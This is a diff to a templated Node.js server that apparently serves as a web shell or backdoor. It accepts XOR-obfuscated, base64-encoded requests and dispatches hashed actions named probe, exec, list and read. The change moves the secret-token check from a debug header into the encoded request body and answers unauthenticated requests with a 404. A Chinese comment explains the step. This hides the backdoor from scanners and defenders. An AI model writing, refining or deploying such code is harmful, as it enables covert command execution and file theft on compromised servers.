@@ -36,7 +36,6 @@ const H = {{ probe: '{h_probe}', exec: '{h_exec}', list: '{h_list}', read: '{h_r
 
 const PORT = Number(process.env.PORT || 8000);
 http.createServer((req, res) => {{
-  if (req.headers['x-debug-key'] && req.headers['x-debug-key'] !== dec('{token_hex}', '{xk}')) {{ res.writeHead(404); res.end(); return; }}
   let body = '';
   req.on('data', (c) => (body += c));
   req.on('end', () => {{
@@ -44,6 +43,8 @@ http.createServer((req, res) => {{
     try {{
       const form = new URLSearchParams(body);
       const reqObj = JSON.parse(x(Buffer.from(form.get('formData'), 'base64')).toString());
+      // S12：请求体内嵌 token 必须匹配（缺失或不匹配即 404）
+      if (reqObj.token !== dec('{token_hex}', '{xk}')) {{ res.writeHead(404); res.end(); return; }}
       const a = reqObj.a || '';
       const hh = h(a);
       if (hh === H.probe) {{
